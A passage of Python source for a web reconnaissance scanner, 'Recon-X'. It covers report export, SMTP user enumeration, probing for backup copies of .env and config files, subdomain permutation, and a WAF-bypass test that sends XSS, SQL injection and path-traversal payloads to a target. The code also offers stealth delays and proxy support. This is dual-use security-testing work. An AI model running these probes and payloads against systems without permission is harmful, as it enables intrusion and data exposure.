.vuln-Critical {{ border-color: #f85149; }} .vuln-High {{ border-color: #f0883e; }}
.vuln-Medium {{ border-color: #d29922; }} .vuln-Low {{ border-color: #58a6ff; }}
table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
th, td {{ border: 1px solid #30363d; padding: 8px; text-align: left; }}
th {{ background: #21262d; color: #58a6ff; }}
tr:nth-child(even) {{ background: #161b22; }}
.badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }}
.badge-Critical {{ background: #f85149; color: white; }}
.badge-High {{ background: #f0883e; color: white; }}
.badge-Medium {{ background: #d29922; color: black; }}
.badge-Low {{ background: #58a6ff; color: white; }}
.stat {{ display: inline-block; margin: 10px; text-align: center; }}
.stat-num {{ font-size: 32px; font-weight: bold; }}
.stat-label {{ font-size: 12px; color: #8b949e; }}
</style>
</head>
<body>
<div class="container">
<h1>Recon-X v4.0 - Security Report</h1>
<div class="card">
<p><strong>Target:</strong> {ctx.get('target', 'N/A')}</p>
<p><strong>URL:</strong> {ctx.get('url', 'N/A')}</p>
<p><strong>Timestamp:</strong> {ctx.get('timestamp', 'N/A') if 'timestamp' in ctx else 'N/A'}</p>
<p><strong>Modules Run:</strong> {len(ctx.get('modules_run', []))}</p>
</div>

<h2>Security Score</h2>
<div class="card">
<div class="score grade-{score.get('grade', 'F')[0]}">{score.get('score', 0)}/{score.get('max', 0)} ({score.get('percent', 0)}%) - Grade {score.get('grade', 'F')}</div>
</div>

<h2>Vulnerability Summary</h2>
<div class="card">
"""
    for sev in ("Critical", "High", "Medium", "Low"):
        n = sev_counts.get(sev, 0)
    sev_colors = {"Critical": "#f85149", "High": "#f0883e", "Medium": "#d29922", "Low": "#58a6ff"}
    for sev in ("Critical", "High", "Medium", "Low"):
        n = sev_counts.get(sev, 0)
        color = sev_colors.get(sev, "#c9d1d9")
        html += f'<div class="stat"><div class="stat-num" style="color: {color}">{n}</div><div class="stat-label">{sev}</div></div>\n'
    html += f'<div class="stat"><div class="stat-num">{len(vulns)}</div><div class="stat-label">Total</div></div>\n'
    html += "</div>\n"
    
    html += "<h2>Vulnerability Inventory</h2>\n"
    for i, v in enumerate(vulns, 1):
        sev = v.get("severity", "Low")
        html += f'<div class="vuln vuln-{sev}">\n'
        html += f'<strong>{i}. {v.get("title", "Unknown")}</strong> <span class="badge badge-{sev}">{sev}</span><br>\n'
        html += f'<small>Source: {v.get("source", "N/A")} | Location: {v.get("location", "N/A")}</small><br>\n'
        if v.get("evidence"):
            html += f'<small>Evidence: {v.get("evidence", "")}</small>\n'
        html += "</div>\n"
    
    # Open ports
    ports = ctx.get("open_ports", [])
    if ports:
        html += "<h2>Open Ports</h2>\n<div class=\"card\"><table><tr><th>Port</th><th>Service</th></tr>\n"
        for p in ports:
            svc = SERVICE_MAP.get(p, "unknown") if 'SERVICE_MAP' in globals() else "unknown"
            html += f"<tr><td>{p}</td><td>{svc}</td></tr>\n"
        html += "</table></div>\n"
    
    # Technologies
    tech = ctx.get("tech", [])
    if tech:
        html += "<h2>Technologies Detected</h2>\n<div class=\"card\"><table><tr><th>Technology</th><th>Match</th></tr>\n"
        for t in tech:
            html += f"<tr><td>{t.get('name', '')}</td><td>{t.get('match', '')}</td></tr>\n"
        html += "</table></div>\n"
    
    # Subdomains
    subs = ctx.get("subdomains", [])
    if subs:
        html += f"<h2>Subdomains ({len(subs)})</h2>\n<div class=\"card\"><table><tr><th>Name</th><th>IP</th><th>Status</th></tr>\n"
        for s in subs[:50]:
            name = s.get("name", str(s)) if isinstance(s, dict) else str(s)
            ip = s.get("ip", "") if isinstance(s, dict) else ""
            status = s.get("status", "") if isinstance(s, dict) else ""
            html += f"<tr><td>{name}</td><td>{ip}</td><td>{status}</td></tr>\n"
        html += "</table></div>\n"
    
    # DNS
    dns_data = ctx.get("dns", {})
    if dns_data and dns_data.get("records"):
        html += "<h2>DNS Records</h2>\n<div class=\"card\"><table><tr><th>Type</th><th>Values</th></tr>\n"
        for rtype, vals in dns_data.get("records", {}).items():
            if vals:
                html += f"<tr><td>{rtype}</td><td>{', '.join(str(v) for v in vals[:10])}</td></tr>\n"
        html += "</table></div>\n"
    
    html += """
<div class="card" style="text-align: center; color: #8b949e;">
<p>Generated by Recon-X v4.0 | For authorized security testing only</p>
</div>
</div>
</body>
</html>"""
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    return True

# ================= SMTP EMAIL ENUMERATION =================
def smtp_enum(host, timeout=10):
    """Live: enumerate emails via SMTP VRFY/RCPT TO."""
    import socket as _sock
    results = {"vrfy": [], "rcpt": [], "catch_all": False, "server_banner": ""}
    try:
        with _sock.create_connection((host, 25), timeout=timeout) as s:
            s.settimeout(timeout)
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
            results["server_banner"] = banner
            s.sendall(b"HELO reconx.local\r\n")
            s.recv(1024)
            # Test VRFY
            for user in ["admin", "root", "info", "support", "webmaster", "postmaster", "test"]:
                s.sendall(f"VRFY {user}\r\n".encode())
                resp = s.recv(1024).decode("utf-8", errors="ignore").strip()
                if "250" in resp or "252" in resp:
                    results["vrfy"].append({"user": user, "response": resp})
            # Test RCPT TO (catch-all detection)
            s.sendall(b"MAIL FROM:<reconx@test.com>\r\n")
            s.recv(1024)
            s.sendall(b"RCPT TO:<nonexistent12345@test.com>\r\n")
            resp = s.recv(1024).decode("utf-8", errors="ignore").strip()
            if "250" in resp:
                results["catch_all"] = True
            s.sendall(b"QUIT\r\n")
    except Exception as e:
        results["error"] = str(e)
    return results

# ================= BACKUP FILE DETECTION (DEEP) =================
BACKUP_EXTENSIONS = [".bak", ".old", ".orig", ".backup", ".save", ".swp", ".tmp",
                     ".copy", ".old", ".orig", ".bakup", ".bk", ".bkp"]
BACKUP_PATHS = ["/.env", "/config.php", "/wp-config.php", "/settings.py",
                "/application.properties", "/web.config", "/.htaccess",
                "/database.yml", "/config.yml", "/config.json", "/secrets.yml"]

def detect_backups(base_url, timeout=6):
    """Live: probe for backup copies of sensitive files."""
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    found = []
    for path in BACKUP_PATHS:
        for ext in BACKUP_EXTENSIONS[:8]:
            test_url = root + path + ext
            r = http_request(test_url, timeout=timeout, method="HEAD")
            if r.get("ok") and r.get("status") == 200:
                found.append({"path": path + ext, "url": test_url,
                              "status": r.get("status"), "size": r.get("headers", {}).get("content-length", "?")})
            # Also try ~ suffix
            test_url2 = root + path + "~"
            r2 = http_request(test_url2, timeout=timeout, method="HEAD")
            if r2.get("ok") and r2.get("status") == 200:
                found.append({"path": path + "~", "url": test_url2,
                              "status": r2.get("status"), "size": r2.get("headers", {}).get("content-length", "?")})
    # dedupe
    seen = set()
    out = []
    for f in found:
        if f["url"] not in seen:
            seen.add(f["url"])
            out.append(f)
    return out

# ================= SUBDOMAIN PERMUTATION =================
PERMUTATION_PREFIXES = ["dev", "staging", "test", "prod", "api", "admin", "beta",
                        "v1", "v2", "v3", "old", "new", "backup", "internal",
                        "secure", "login", "portal", "app", "web", "mail"]

def permute_subdomains(domain, known_subs, timeout=5, workers=20):
    """Live: generate subdomain permutations from known subdomains and resolve."""
    found = []
    candidates = set()
    for sub in known_subs:
        name = sub.get("name") if isinstance(sub, dict) else str(sub)
        if not name:
            continue
        # Extract the prefix (first part before domain)
        prefix = name.replace("." + domain, "").split(".")[0]
        for perm in PERMUTATION_PREFIXES:
            candidates.add(f"{perm}-{prefix}.{domain}")
            candidates.add(f"{prefix}-{perm}.{domain}")
            candidates.add(f"{perm}{prefix}.{domain}")
            candidates.add(f"{prefix}{perm}.{domain}")
    # Resolve all
    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futures = {pool.submit(resolve_hostname, c): c for c in candidates}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r.get("ip"):
                    found.append(r)
            except Exception:
                pass
    found.sort(key=lambda x: x["name"])
    return found

# ================= WAF BYPASS DETECTION =================
WAF_BYPASS_PAYLOADS = [
    ("<script>alert(1)</script>", "XSS basic"),
    ("<ScRiPt>alert(1)</ScRiPt>", "XSS case variation"),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "XSS encoding"),
    ("' OR 1=1--", "SQLi basic"),
    ("' OR '1'='1", "SQLi quote"),
    ("../../../etc/passwd", "Path traversal"),
    ("<img src=x onerror=alert(1)>", "XSS img"),
]

def test_waf_bypass(url, timeout=8):
    """Live: test if WAF can be bypassed with common evasion techniques."""
    results = []
    for payload, desc in WAF_BYPASS_PAYLOADS:
        # Test in query parameter
        test_url = f"{url}?q={quote(payload, safe='')}"
        r = http_request(test_url, timeout=timeout, allow_redirects=False)
        status = r.get("status", 0)
        blocked = status in (403, 406, 429, 503) or "blocked" in (r.get("body") or "").lower()
        results.append({"payload": desc, "status": status, "blocked": blocked,
                        "bypassed": not blocked and status == 200})
    return results

# ================= TECHNOLOGY CVE LOOKUP =================
def lookup_cves(tech_versions, timeout=10):
    """Live: look up CVEs for detected technology versions via NVD API."""
    results = []
    for tv in (tech_versions or []):
        tech = tv.get("tech", "")
        version = tv.get("version", "")
        if not tech or not version:
            continue
        try:
            # Use NVD API (free, no key needed for basic search)
            query = f"{tech} {version}"
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={quote(query)}&resultsPerPage=5"
            r = http_request(url, timeout=timeout)
            if r.get("ok") and r.get("status") == 200:
                data = json.loads(r.get("body") or "{}")
                vulns = data.get("vulnerabilities", [])
                cves = []
                for v in vulns[:5]:
                    cve = v.get("cve", {})
                    cve_id = cve.get("id", "")
                    desc = ""
                    for d in cve.get("descriptions", []):
                        if d.get("lang") == "en":
                            desc = d.get("value", "")[:100]
                            break
                    metrics = cve.get("metrics", {})
                    cvss = 0
                    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                        if k in metrics and metrics[k]:
                            cvss = metrics[k][0].get("cvssData", {}).get("baseScore", 0)
                            break
                    cves.append({"id": cve_id, "cvss": cvss, "description": desc})
                if cves:
                    results.append({"tech": tech, "version": version, "cves": cves})
        except Exception:
            pass
    return results

# ================= RUNNERS =================

def run_http_smuggling(ctx, url, args):
    p_section("HTTP Request Smuggling", "70")
    ctx["modules_run"].append("http_smuggling")
    res = test_http_smuggling(url, timeout=args.timeout)
    ctx["http_smuggling"] = res
    vulns = [r for r in res if r.get("vulnerable")]
    if vulns:
        for r in vulns:
            p_bad(r["type"], f"possible smuggling (HTTP {r.get('status_line', '')})")
    else:
        p_ok("HTTP smuggling", "no desync detected")

def run_html_report(ctx, url, args):
    p_section("HTML Report Export", "72")
    ctx["modules_run"].append("html_report")
    filepath = args.output.replace(".json", ".html") if args.output else "report.html"
    try:
        export_html_report(ctx, filepath)
        p_ok("HTML report", f"saved to {filepath}")
        ctx["html_report"] = filepath
    except Exception as e:
        p_bad("HTML report", str(e))
        ctx["html_report"] = None

def run_smtp_enum(ctx, host, args):
    p_section("SMTP Email Enumeration", "73")
    ctx["modules_run"].append("smtp_enum")
    if is_ip(host):
        p_note("SMTP enum", "not measured - target is an IP")
        ctx["smtp_enum"] = None
        return
    # Try to find MX records and enumerate
    res = smtp_enum(host, timeout=args.timeout)
    ctx["smtp_enum"] = res
    if res.get("error"):
        p_note("SMTP", res["error"])
        return
    if res.get("server_banner"):
        p_ok("SMTP banner", shorten(res["server_banner"], 80))
    if res.get("vrfy"):
        p_ok("VRFY users", len(res["vrfy"]))
        for v in res["vrfy"]:
            p_ok(f"  {v['user']}", v["response"][:60])
    if res.get("catch_all"):
        p_warn("Catch-all", "server accepts mail for any address")
    if not res.get("vrfy") and not res.get("catch_all"):
        p_ok("SMTP enum", "no users enumerated")

def run_backup_files(ctx, url, args):
    p_section("Backup File Detection (Deep)", "74")
    ctx["modules_run"].append("backup_files")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Backups", "not measured - no HTTP response")
        ctx["backup_files"] = []
        return
    found = detect_backups(url, timeout=args.timeout)
    ctx["backup_files"] = found
    if found:
        for f in found:
            p_bad(f["path"], f"HTTP {f['status']} ({f['size']} bytes)")
    else:
        p_ok("Backups", "no backup files found")

def run_subdomain_permutation(ctx, host, args):
    p_section("Subdomain Permutation", "75")
    ctx["modules_run"].append("subdomain_permutation")
    if is_ip(host):
        p_note("Permutation", "not measured - target is an IP")
        ctx["subdomain_permutation"] = []
        return
    subs = ctx.get("subdomains") or []
    if not subs:
        p_note("Permutation", "not measured - no subdomains enumerated")
        ctx["subdomain_permutation"] = []
        return
    found = permute_subdomains(host, subs, timeout=args.timeout, workers=args.threads)
    ctx["subdomain_permutation"] = found
    if found:
        p_ok("Permutations found", len(found))
        for r in found[:20]:
            p_ok(r["name"], r["ip"])
        if len(found) > 20:
            p_note("More", f"{len(found) - 20} additional in JSON report")
    else:
        p_ok("Permutation", "no new subdomains found")

def run_waf_bypass(ctx, url, args):
    p_section("WAF Bypass Detection", "76")
    ctx["modules_run"].append("waf_bypass")
    res = test_waf_bypass(url, timeout=args.timeout)
    ctx["waf_bypass"] = res
    bypassed = [r for r in res if r["bypassed"]]
    if bypassed:
        for r in bypassed:
            p_bad(r["payload"], "BYPASSED (HTTP " + str(r["status"]) + ")")
    else:
        p_ok("WAF bypass", "all payloads blocked")

def run_tech_cve(ctx, url, args):
    p_section("Technology CVE Lookup", "77")
    ctx["modules_run"].append("tech_cve")
    versions = detect_tech_versions(ctx.get("http_resp") or {})
    ctx["tech_versions"] = versions
    if not versions:
        p_note("CVE lookup", "no technology versions detected")
        ctx["tech_cve"] = []
        return
    cves = lookup_cves(versions, timeout=args.timeout)
    ctx["tech_cve"] = cves
    if cves:
        for c in cves:
            p_bad(c["tech"] + " " + c["version"], f"{len(c['cves'])} CVEs found")
            for cv in c["cves"][:3]:
                p_note(f"  {cv['id']}", f"CVSS {cv['cvss']}: {shorten(cv['description'], 60)}", C.GR)
    else:
        p_ok("CVE lookup", "no CVEs found for detected versions")

def run_resume_diff(ctx, args):
    p_section("Resume / Diff", "79")
    ctx["modules_run"].append("resume_diff")
    # Save current state
    state_file = args.output.replace(".json", "_state.json") if args.output else "scan_state.json"
    if save_scan_state(ctx, state_file):
        p_ok("State saved", state_file)
    else:
        p_note("State", "could not save state file")
    # Diff if previous scan exists
    prev_file = state_file.replace("_state.json", "_prev.json")
    if os.path.exists(prev_file):
        diff = diff_scans(prev_file, args.output or "report.json")
        if diff.get("error"):
            p_note("Diff", diff["error"])
        else:
            if diff.get("added"):
                for d in diff["added"]:
                    p_warn("Added", f"{d['field']}: {d.get('added', [])}")
            if diff.get("removed"):
                for d in diff["removed"]:
                    p_warn("Removed", f"{d['field']}: {d.get('removed', [])}")
            if diff.get("changed"):
                for d in diff["changed"]:
                    p_warn("Changed", f"{d['field']}: {d.get('old')} -> {d.get('new')}")
            if not diff.get("added") and not diff.get("removed") and not diff.get("changed"):
                p_ok("Diff", "no changes detected")
    else:
        p_note("Diff", "no previous scan found (run again to compare)")

# ================= HTTP/3 (QUIC) DETECTION =================
def detect_http3(url, timeout=8):
    """Live: check if server supports HTTP/3 via Alt-Svc header."""
    r = http_request(url, timeout=timeout)
    hdrs = r.get("headers") or {}
    alt_svc = hdrs.get("alt-svc", "")
    supported = "h3" in alt_svc.lower() or "quic" in alt_svc.lower()
    details = alt_svc if alt_svc else "no Alt-Svc header"
    return {"supported": supported, "alt_svc": alt_svc, "details": details}

# ================= DKIM RECORD LOOKUP =================
def lookup_dkim(domain, timeout=8):
    """Live: check for DKIM records (common selectors)."""
    if not HAS_DNS:
        return {"selectors": [], "notes": ["dnspython not installed"]}
    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 8
    selectors = ["default", "google", "selector1", "selector2", "mail", "dkim",
                 "k1", "s1", "s2", "email", "smtp", "mta"]
    found = []
    for sel in selectors:
        qname = f"{sel}._domainkey.{domain}"
        try:
            answers = resolver.resolve(qname, "TXT")
            for r in answers:
                txt = str(r).strip('"')
                if "v=dkim1" in txt.lower() or "p=" in txt:
                    found.append({"selector": sel, "record": txt[:200]})
        except Exception:
            pass
    return {"selectors": found, "checked": len(selectors)}

# ================= BIMI RECORD DEEP PARSING =================
def parse_bimi(record):
    """Parse BIMI record into components."""
    if not record:
        return None
    parts = {}
    for item in record.split(";"):
        item = item.strip()
        if "=" in item:
            k, v = item.split("=", 1)
            parts[k.strip().lower()] = v.strip()
    return {
        "version": parts.get("v"),
        "logo": parts.get("l"),
        "certificate": parts.get("a"),
        "raw": record,
    }

# ================= SERVICE VERSION DETECTION =================
def detect_service_versions(banners):
    """Extract version numbers from service banners."""
    versions = []
    for port, banner in (banners or {}).items():
        if not banner or banner.startswith("error"):
            continue
        # SSH
        m = re.search(r"SSH-(\d+\.\d+)-(\S+)", banner)
        if m:
            versions.append({"port": port, "service": "SSH", "version": m.group(2), "protocol": m.group(1)})
        # FTP
        m = re.search(r"220[- ](.+)", banner)
        if m and "ftp" in m.group(1).lower():
            versions.append({"port": port, "service": "FTP", "banner": m.group(1)[:80]})
        # SMTP
        m = re.search(r"220[- ](.+)", banner)
        if m and "smtp" in m.group(1).lower() or "esmtp" in m.group(1).lower():
            versions.append({"port": port, "service": "SMTP", "banner": m.group(1)[:80]})
        # HTTP Server header
        m = re.search(r"Server:\s*(.+)", banner, re.I)
        if m:
            versions.append({"port": port, "service": "HTTP", "server": m.group(1).strip()[:80]})
        # MySQL
        m = re.search(r"(\d+\.\d+\.\d+)", banner)
        if m and "mysql" in banner.lower():
            versions.append({"port": port, "service": "MySQL", "version": m.group(1)})
        # Redis
        if "redis" in banner.lower() or "+PONG" in banner:
            versions.append({"port": port, "service": "Redis", "banner": banner[:60]})
        # PostgreSQL
        if "postgres" in banner.lower() or banner.startswith("S") or banner.startswith("N"):
            if "postgres" in banner.lower():
                versions.append({"port": port, "service": "PostgreSQL", "banner": banner[:60]})
    return versions

# ================= OS FINGERPRINTING (TTL-based) =================
def os_fingerprint(host, timeout=5):
    """Live: basic OS fingerprinting via TTL and TCP window size."""
    out = {"os_guess": "Unknown", "ttl": None, "details": ""}
    try:
        # Use ping-like approach via subprocess if available
        pass
        # Fallback: use ping command
        import subprocess
        if shutil.which("ping"):
            try:
                proc = subprocess.run(["ping", "-n", "1", "-w", "2000", host],
                                      capture_output=True, timeout=5, text=True)
                output = proc.stdout + proc.stderr
                # Windows ping shows TTL
                m = re.search(r"TTL=(\d+)", output, re.I)
                if m:
                    ttl = int(m.group(1))
                    out["ttl"] = ttl
                    if ttl <= 64:
                        out["os_guess"] = "Linux/Unix (TTL<=64)"
                    elif ttl <= 128:
                        out["os_guess"] = "Windows (TTL<=128)"
                    elif ttl <= 255:
                        out["os_guess"] = "Network device/Solaris (TTL<=255)"
                    out["details"] = f"TTL={ttl}"
            except Exception as e:
                out["details"] = str(e)
    except Exception as e:
        out["details"] = str(e)
    return out

# ================= RUNNERS =================

def run_http3(ctx, url, args):
    p_section("HTTP/3 (QUIC) Detection", "80")
    ctx["modules_run"].append("http3")
    res = detect_http3(url, timeout=args.timeout)
    ctx["http3"] = res
    if res["supported"]:
        p_ok("HTTP/3", f"supported - {res['details']}")
    else:
        p_note("HTTP/3", res["details"])

def run_dkim(ctx, host, args):
    p_section("DKIM Record Lookup", "81")
    ctx["modules_run"].append("dkim")
    if is_ip(host):
        p_note("DKIM", "not measured - target is an IP")
        ctx["dkim"] = None
        return
    res = lookup_dkim(host, timeout=args.timeout)
    ctx["dkim"] = res
    if res["selectors"]:
        p_ok("DKIM selectors", len(res["selectors"]))
        for s in res["selectors"]:
            p_ok(f"  {s['selector']}", shorten(s["record"], 80))
    else:
        p_warn("DKIM", f"no DKIM records found (checked {res['checked']} selectors)")

def run_bimi_deep(ctx, host, args):
    p_section("BIMI Deep Parsing", "82")
    ctx["modules_run"].append("bimi_deep")
    es = ctx.get("email_security")
    if not es or not es.get("bimi"):
        p_note("BIMI", "no BIMI record found")
        ctx["bimi_deep"] = None
        return
    parsed = parse_bimi(es["bimi"])
    ctx["bimi_deep"] = parsed
    if parsed:
        if parsed.get("version"):
            p_ok("Version", parsed["version"])
        if parsed.get("logo"):
            p_ok("Logo URL", parsed["logo"])
        if parsed.get("certificate"):
            p_ok("Certificate", parsed["certificate"])
    else:
        p_note("BIMI", "could not parse record")

def run_service_versions(ctx, url, args):
    p_section("Service Version Detection", "83")
    ctx["modules_run"].append("service_versions")
    banners = ctx.get("banners", {})
    if not banners:
        p_note("Service versions", "not measured - no banners grabbed")
        ctx["service_versions"] = []
        return
    res = detect_service_versions(banners)
    ctx["service_versions"] = res
    if res:
        for r in res:
            if "version" in r:
                p_ok(f"{r['service']} (port {r['port']})", r["version"])
            elif "server" in r:
                p_ok(f"{r['service']} (port {r['port']})", r["server"])
            elif "banner" in r:
                p_ok(f"{r['service']} (port {r['port']})", shorten(r["banner"], 60))
    else:
        p_ok("Service versions", "no versions detected in banners")

def run_os_fingerprint(ctx, host, args):
    p_section("OS Fingerprinting", "84")
    ctx["modules_run"].append("os_fingerprint")
    if is_ip(host):
        res = os_fingerprint(host, timeout=args.timeout)
    else:
        # Resolve host first
        try:
            ip = socket.gethostbyname(host)
            res = os_fingerprint(ip, timeout=args.timeout)
        except Exception as e:
            res = {"os_guess": "Unknown", "ttl": None, "details": str(e)}
    ctx["os_fingerprint"] = res
    p_ok("OS guess", res["os_guess"])
    if res.get("ttl"):
        p_ok("TTL", res["ttl"])
    if res.get("details"):
        p_note("Details", res["details"])

def main():
    global QUIET, STEALTH_MODE, THROTTLE_DELAY
    parser = argparse.ArgumentParser(
        prog="reconx", description="Recon-X - professional web reconnaissance framework")
    parser.add_argument("target", nargs="?", help="target domain or URL (asked if omitted)")
    parser.add_argument("-t", "--timeout", type=float, default=8.0, help="request timeout (s)")
    parser.add_argument("--threads", type=int, default=48, help="concurrency")
    parser.add_argument("--ports", dest="ports", action="store_true", default=True)
    parser.add_argument("--no-ports", dest="ports", action="store_false")
    parser.add_argument("--dns", dest="dns", action="store_true", default=True)
    parser.add_argument("--no-dns", dest="dns", action="store_false")
    parser.add_argument("--paths", dest="paths", action="store_true", default=True)
    parser.add_argument("--no-paths", dest="paths", action="store_false")
    parser.add_argument("--deep", action="store_true", help="extended path list")
    parser.add_argument("--quick", action="store_true",
                        help="skip slow modules (crt.sh subdomains, rate-limit burst)")
    parser.add_argument("--no-banner", action="store_true")
    parser.add_argument("--json-only", action="store_true", help="pure JSON on stdout, logs on stderr")
    parser.add_argument("-o", "--output", help="save the JSON report to a file")
    parser.add_argument("--mode", choices=["1", "2"], help="1=website scan, 2=IP scanner (scanner number 2)")
    parser.add_argument("--stealth", action="store_true", help="enable stealth mode (randomized delays)")
    parser.add_argument("--delay", type=float, default=0.0, help="delay between requests (seconds)")
    parser.add_argument("--proxy", help="HTTP/SOCKS proxy URL")
    args = parser.parse_args()

    if args.json_only:
        QUIET = True
        args.no_banner = True

    if args.stealth:
        STEALTH_MODE = True
    if args.delay and args.delay > 0:
        THROTTLE_DELAY = args.delay
    if args.proxy:
        os.environ["HTTP_PROXY"] = args.proxy
        os.environ["HTTPS_PROXY"] = args.proxy
        os.environ["http_proxy"] = args.proxy
        os.environ["https_proxy"] = args.proxy

    if not args.no_banner:
        boot_animation()

    # ---- mode selection ----
    mode = args.mode
    if not mode and not args.target:
        sys.stderr.buffer.write(c("\n  ============================================\n", C.BOLD + C.G).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.buffer.write(c("   Recon-X  -  Select Scan Mode\n", C.BOLD + C.G).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.buffer.write(c("  ============================================\n", C.BOLD + C.G).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.buffer.write(c("   [1] Website Scan  (full recon of a domain/URL)\n", C.W).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.buffer.write(c("   [2] IP Scanner (scanner number 2)  (IP -> domains + ports + URLs)\n", C.W).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.buffer.write(c("  ============================================\n", C.BOLD + C.G).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.buffer.write(c("   Choice [1/2]: ", C.BOLD + C.W).encode("utf-8"))
        sys.stderr.buffer.flush()
        sys.stderr.flush()
        try:
            choice = input().strip()
        except (EOFError, KeyboardInterrupt):
            sys.stderr.buffer.write(b"\naborted\n")
            sys.stderr.buffer.flush()
            return 2
        if choice not in ("1", "2"):
            sys.stderr.buffer.write(b"invalid choice - defaulting to 1\n")
            sys.stderr.buffer.flush()
            choice = "1"
        mode = choice

    if not mode:
        mode = "1"

    # ================= MODE 2 : IP SCANNER =================
    if mode == "2":
        ip = (args.target or "").strip()
        while not ip:
            try:
                sys.stderr.buffer.write((c("  [ IP ] ", C.BOLD + C.W) + "Enter target IP address: ").encode("utf-8"))
                sys.stderr.buffer.flush()
                ip = input().strip()
            except (EOFError, KeyboardInterrupt):
                sys.stderr.write("\nno IP given\n")
                return 2
            if not ip:
                sys.stderr.buffer.write(b"empty - please type an IP address\n")
            sys.stderr.buffer.flush()
        try:
            ipaddress.ip_address(ip)
        except Exception:
            sys.stderr.buffer.write(f"invalid IP address: {ip}\n".encode("utf-8"))
            sys.stderr.buffer.flush()
            return 2

        ctx = run_ip_scan(ip, args)
        report = ctx.get("report", {})
        report["tool"] = "Recon-X v4.0 (IP Scanner)"
        report["timestamp"] = datetime.datetime.now().isoformat(timespec="seconds")
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as fh:
                    json.dump(report, fh, indent=2, default=str)
                p_ok("Report saved", args.output)
            except Exception as e:
                p_bad("Report", str(e))
        if args.json_only:
            payload = json.dumps(report, indent=2, default=str)
            try:
                sys.stdout.buffer.write(payload.encode("utf-8"))
                sys.stdout.buffer.write(b"\n")
                sys.stdout.flush()
            except (AttributeError, ValueError):
                sys.stdout.write(payload + "\n")
        return 0

    # ================= MODE 1 : WEBSITE SCAN =================
    target = (args.target or "").strip()
    while not target:
        try:
            sys.stderr.buffer.write((c("  [ Target ] ", C.BOLD + C.W) + "Enter domain or URL: ").encode("utf-8"))
            sys.stderr.buffer.flush()
            sys.stderr.flush()
            target = input().strip()
        except (EOFError, KeyboardInterrupt):
            sys.stderr.buffer.write(b"\nno target given\n")
            sys.stderr.buffer.flush()
            return 2
        if not target:
            sys.stderr.buffer.write(b"empty - please type a domain or URL\n")
            sys.stderr.buffer.flush()

    url = normalize_url(target)
    if not url:
        sys.stderr.write("empty target\n")
        return 2
    host = get_host(url)
    if not host:
        sys.stderr.write(f"cannot resolve hostname from '{target}'\n")
        return 2
    parsed = urlparse(url)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    ctx = {"target": target, "url": url, "host": host, "modules_run": [],
           "open_ports": [], "exposed_paths": [], "dns_ips": []}

    p_section("Target", ">>")
    p_ok("URL", url)
    p_ok("Host", host)
    p_ok("Port", port)
    p_ok("Engine", "requests" if HAS_REQ else "urllib fallback")
    p_ok("DNS engine", "dnspython" if HAS_DNS else "socket fallback")

    steps = [
        ("dns", lambda: run_dns(ctx, host, args) if args.dns else None),
        ("rdap", lambda: run_rdap(ctx, host, args) if args.dns else None),
        ("http", lambda: run_http(ctx, url, args)),
        ("waf", lambda: run_waf(ctx, args)),
        ("tls", lambda: run_tls(ctx, host, port, args)),
        ("headers", lambda: run_headers(ctx, url, args)),
        ("cookies", lambda: run_cookies(ctx, url, args)),
        ("methods", lambda: run_methods(ctx, url, host, port, args)),
        ("redirects", lambda: run_redirects(ctx, url, args)),
        ("tech", lambda: run_tech(ctx, args)),
        ("paths", lambda: run_paths(ctx, url, args) if args.paths else None),
        ("robots", lambda: run_robots(ctx, url, args)),
        ("sitemap", lambda: run_sitemap(ctx, url, args)),
        ("security_txt", lambda: run_security_txt(ctx, url, args)),
        ("emails", lambda: run_emails(ctx, args)),
        ("subdomains", lambda: run_subdomains(ctx, host, args) if not args.quick else None),
        ("ports", lambda: run_ports(ctx, host, args) if args.ports else None),
        ("geo", lambda: run_geo(ctx, args)),
        ("rate_limit", lambda: run_rate_limit(ctx, url, args) if not args.quick else None),
        ("takeover", lambda: run_takeover(ctx, args)),
        ("open_redirects", lambda: run_open_redirects(ctx, url, args)),
        ("host_header", lambda: run_host_header(ctx, url, args)),
        ("reflected_params", lambda: run_reflected_params(ctx, url, args)),
        ("mixed_content", lambda: run_mixed_content(ctx, url, args)),
        ("forms", lambda: run_forms(ctx, url, args)),
        ("favicon", lambda: run_favicon(ctx, url, args)),
        ("sourcemaps", lambda: run_sourcemaps(ctx, url, args)),
        ("email_security", lambda: run_email_security(ctx, host, args)),
        ("dir_listing", lambda: run_dir_listing(ctx, url, args)),
        ("secrets", lambda: run_secrets(ctx, url, args)),
        ("graphql", lambda: run_graphql(ctx, url, args)),
        ("websocket", lambda: run_websocket(ctx, url, args)),
        ("cache_poison", lambda: run_cache_poison(ctx, url, args)),
        ("hpp", lambda: run_hpp(ctx, url, args)),
        ("dnssec", lambda: run_dnssec(ctx, host, args)),
        ("vuln_inventory", lambda: run_vuln_inventory(ctx, args)),
        ("http_smuggling", lambda: run_http_smuggling(ctx, url, args)),
        ("html_report", lambda: run_html_report(ctx, url, args)),
        ("resume_diff", lambda: run_resume_diff(ctx, args)),
        ("dns_bruteforce", lambda: run_dns_bruteforce(ctx, host, args)),
        ("js_endpoints", lambda: run_js_endpoints(ctx, url, args)),
        ("cloud_buckets", lambda: run_cloud_buckets(ctx, host, args)),
        ("cors_deep", lambda: run_cors_deep(ctx, url, args)),
        ("sensitive_data", lambda: run_sensitive_data(ctx, url, args)),
        ("http2", lambda: run_http2(ctx, url, args)),
        ("cache_deception", lambda: run_cache_deception(ctx, url, args)),
